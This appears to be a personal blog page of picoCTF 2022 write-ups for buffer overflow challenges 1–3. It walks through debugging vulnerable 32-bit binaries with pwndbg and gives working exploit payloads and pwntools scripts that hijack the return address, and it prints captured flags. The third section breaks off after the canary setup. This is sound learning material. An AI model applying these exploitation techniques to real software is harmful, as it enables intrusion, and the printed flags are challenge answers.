---
permalink: /misc/pwn
title: pwn
---

<br>

Websites with pwn challs:

<https://play.picoctf.org/practice?category=6>

<https://pwnable.kr>

<https://pwnable.tw>

<https://ropemporium.com>

<https://www.smashthestack.org/main.html>

<https://pwn.college>

<br>
<br>
<br>






# buffer overflow 1 - picoCTF 2022

<https://play.picoctf.org/practice/challenge/258>

My first ever pwn challenge... let's do it.

First I downloaded the vuln file and tried to run it.

```
$ ./vuln
bash: ./vuln: Permission denied
```

ok let's change the permissions.

```
$ chmod +x vuln 

$ ./vuln 
bash: ./vuln: cannot execute: required file not found
```

hmm weird. Let's get some more info

```
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=685b06b911b19065f27c2d369c18ed09fbadb543, for GNU/Linux 3.2.0, not stripped
```

oh it's 32-bit, gotta install lib32-glibc.

```
$ sudo pacman -S lib32-glibc

$ ./vuln 
Please enter your string: 
test
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
```

cool now we can actually run the ELF.

Then I installed <https://github.com/pwndbg/pwndbg/tree/dev>

```
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

Then when you launch gdb you see the pwndbg extension being used.

```
$ gdb
...

pwndbg: loaded 154 pwndbg commands and 44 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $base, $ida GDB functions (can be used with print/break)
------- tip of the day (disable with set show-tips off) -------
Disable Pwndbg context information display with set context-sections ''
pwndbg>
```

If you don't want to use the extension you can enable/disable it in `~/.gdbinit`:

```
set debuginfod enabled on
# source /home/connor/Documents/pwndbg/gdbinit.py
```

```c
void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```

Note the vulnerable gets() function used, which we'll use to overflow buf and edit the EIP register to point to the win function. 


> EIP is a register in x86 architectures (32bit). It holds the "Extended Instruction Pointer" for the stack. In other words, it tells the computer where to go next to execute the next command and controls the flow of a program.

Decompiling with IDA:

```
int vuln()
{
  int return_address; // eax
  char v2[36]; // [esp+0h] [ebp-28h] BYREF

  gets(v2);
  return_address = get_return_address();
  return printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", return_address);
}
```

The return_address int is 4 bytes, plus the char buffer is 36 bytes, plus the EBP is 4 bytes.

After those 44 we are overwriting the return address. Let's verify it:

```python
>>> 'A'*44 + 'BBBB'
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB'
```

```
pwndbg> run
Starting program:  
No executable file specified.
Use the "file" or "exec-file" command.
pwndbg> exec-file vuln
pwndbg> run
Starting program: /home/connor/Desktop/vuln 
[Thread debugging using libthread_db enabled]                                                              
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Okay, time to return... Fingers Crossed... Jumping to 0x42424242

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────
*EAX  0x41
*EBX  0x41414141 ('AAAA')
 ECX  0x0
 EDX  0x0
*EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
*ESI  0x8049350 ◂— endbr32 
*EBP  0x41414141 ('AAAA')
*ESP  0xffffd5f0 ◂— 0xffffff00
*EIP  0x42424242 ('BBBB')
────────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────────
Invalid address 0x42424242

...
```

And you can see `*EIP  0x42424242 ('BBBB')` we can control EIP by changing BBBB :) 

Now let's find the address of the win function. 

```
pwndbg> file vuln
Reading symbols from vuln...
Downloading separate debug info for /home/connor/Desktop/vuln
(No debugging symbols found in vuln)                                                                       
pwndbg> disassemble win
Dump of assembler code for function win:
   0x080491f6 <+0>:     endbr32
...
```

We get `080491f6`, then converting to little endian, is `f6910408`.

Creating the payload:

```python
import sys
sys.stdout.buffer.write(b"A"*44 + bytes.fromhex('f6910408'))
```

```
[~/Desktop] 
$ python create_payload.py > payload 

[~/Desktop] 
$ ./vuln < payload 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
Please create 'flag.txt' in this directory with your own debugging flag.

[~/Desktop] 
$ echo "testflag" > flag.txt

[~/Desktop] 
$ ./vuln < payload 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
testflag
Segmentation fault (core dumped)
```

It works locally!

You can also use this function `from pwn import p32` to avoid manually converting to little endian.

```python
from pwn import p32, remote

payload = b"A"*44 + p32(0x080491f6)
io = remote("saturn.picoctf.net", 56437)
io.read()
io.sendline(payload)
io.interactive()
```

```
$ python solve.py 
[+] Opening connection to saturn.picoctf.net on port 56437: Done
[*] Switching to interactive mode
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_6462ca2d}
```





<br>
<br>
<br>

# buffer overflow 2 - picoCTF 2022

<https://play.picoctf.org/practice/challenge/259>

```python
>>> 'a'*112 + 'BBBB'
'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaBBBB'
```

```
pwndbg> run
...
Please enter your string: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaBBBB
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaBBBB

Program received signal SIGSEGV, Segmentation fault.
...
*EIP  0x42424242 ('BBBB')
```

```
pwndbg> disassemble win
Dump of assembler code for function win:
   0x08049296 <+0>:     endbr32
```

```python
from pwn import p32
import sys
payload = b"A"*112 + p32(0x08049296)
sys.stdout.buffer.write(payload)
```

This jumps to the win function but segfaults. Let's look at the win function:

```c
void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}
```

We want to overwrite arg1 and arg2. 64-bit programs take function parameters from registers, <br>
but for 32-bit they're just read off the stack. 

Editing the payload:

```python
payload = b"A"*112 + p32(0x08049296) + b'AAAA' + p32(0xCAFEF00D) + p32(0xF00DF00D)
```

We can see we've changed the first 2 stack variables:

```
00:0000│ esp 0xffffd5f4 ◂— 0xcafef00d
01:0004│     0xffffd5f8 ◂— 0xf00df00d
02:0008│     0xffffd5fc ◂— 0x300
03:000c│     0xffffd600 —▸ 0xffffd620 ◂— 0x1
04:0010│     0xffffd604 —▸ 0xf7e1fe2c (_GLOBAL_OFFSET_TABLE_) ◂— 0x21fd4c
05:0014│     0xffffd608 ◂— 0x0
06:0018│     0xffffd60c —▸ 0xf7c20af9 (__libc_start_call_main+121) ◂— add esp, 0x10
07:001c│     0xffffd610 ◂— 0x0
```

Printing the flag :)

```
$ ./vuln < payload
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AA�AAAA
testflag
```

```python
from pwn import p32, remote

payload = b"A"*112 + p32(0x08049296) + b'AAAA' + p32(0xCAFEF00D) + p32(0xF00DF00D)
io = remote("saturn.picoctf.net", 54716)
io.read()
io.sendline(payload)
io.read()
print(io.read())
```





<br>
<br>
<br>

# buffer overflow 3 - picoCTF 2022

<https://play.picoctf.org/practice/challenge/260>

```c
#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4

char global_canary[CANARY_SIZE];

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      fflush(stdout);
      exit(0);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}
```

They've used a custom canary to try prevent buffer overflow, it's 4 bytes and checks if it's value is the same as at the start of the program. 

```
[~/Desktop] 
$ ./vuln 
Please create 'canary.txt' in this directory with your own debugging canary.

[~/Desktop] 
$ echo "TEST" > canary.txt
```
